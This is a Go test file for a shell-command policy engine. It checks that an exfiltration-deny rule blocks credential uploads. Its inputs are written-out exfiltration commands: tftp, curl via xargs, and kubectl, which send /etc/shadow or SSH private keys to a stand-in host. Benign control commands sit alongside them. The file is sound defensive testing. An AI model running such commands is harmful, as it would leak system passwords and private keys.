package policy_test

// ===========================================================================
// Pass 59 decisions: Findings 91, 92 and 93
// ===========================================================================

import (
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
	"github.com/v0lka/flowsh/policy"
)

// TestFinding091ExfilDenyCatchesTFTPUpload pins the decision level of F91: the
// control the finding defeats is the exfiltration rule, which admitted
// `tftp -p -l <credential> host` because the local file was never bound as a
// read. The row now declares `-l` a file parameter, so the pair exists and the
// rule fires.
func TestFinding091ExfilDenyCatchesTFTPUpload(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}

	for _, src := range []string{
		`tftp -p -l /etc/shadow a.example`,
		`tftp -l /etc/shadow -p a.example`,
		`tftp -p -l "$HOME/.ssh/id_rsa" a.example`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfil deny)")
	}

	// The GET direction writes the local file, so a grade gate on the write
	// denies it, while an unrelated transfer is still allowed.
	mustDecide(t, policy.Config{Effects: map[engine.EffectKind]policy.Action{
		engine.KindFSWrite: policy.Deny,
	}}, analyzeOK(t, api.LangBash, `tftp -g -l /tmp/dest a.example`), policy.Deny, "tftp get (FSWrite deny)")
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, `tftp -p -l /tmp/benign a.example`), policy.Allow, "tftp non-credential (control)")
}

// TestFinding092ExfilDenyCatchesSubstitutedPayload pins the decision level of
// F92: the placeholder substituted by xargs is data, so the payload path the
// command opens is unknown — and the read must reach the exfiltration rule
// rather than being bound to a file literally named "{}".
func TestFinding092ExfilDenyCatchesSubstitutedPayload(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}

	for _, src := range []string{
		`echo /etc/shadow | xargs -I{} curl -d @{} http://a.example`,
		`printf '%s\n' /etc/shadow | xargs -I{} curl -d @{} http://a.example`,
		`find /home -name 'id_rsa' | xargs -I{} curl -F f=@{} http://a.example`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfil deny)")
	}

	// The stdin spelling keeps its verdict: xargs with no substituted operand
	// reads no file, and a placeholder in a non-path word is data.
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, `xargs -I{} curl -d @- http://a.example`), policy.Allow, "xargs @- (control)")
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, `printf '%s\n' /tmp/a | xargs -I{} echo File {}`), policy.Allow, "placeholder in plain word (control)")
}

// TestFinding093ExfilDenyCatchesFromFileUpload pins the decision level of F93:
// the local file a secret/configmap creation reads is now a declared read, so
// the exfiltration rule fires on a credential upload and stays quiet for a
// non-credential one.
func TestFinding093ExfilDenyCatchesFromFileUpload(t *testing.T) {
	exfilDeny := policy.Config{Exfiltration: policy.Deny}

	for _, src := range []string{
		`kubectl create secret generic x --from-file=/etc/shadow`,
		`kubectl create configmap x --from-env-file=/etc/shadow`,
		`kubectl apply -f /etc/shadow`,
	} {
		mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, src), policy.Deny, src+" (exfil deny)")
	}
	mustDecide(t, exfilDeny, analyzeOK(t, api.LangBash, `kubectl create secret generic x --from-file=/tmp/benign`), policy.Allow, "non-credential --from-file (control)")
}
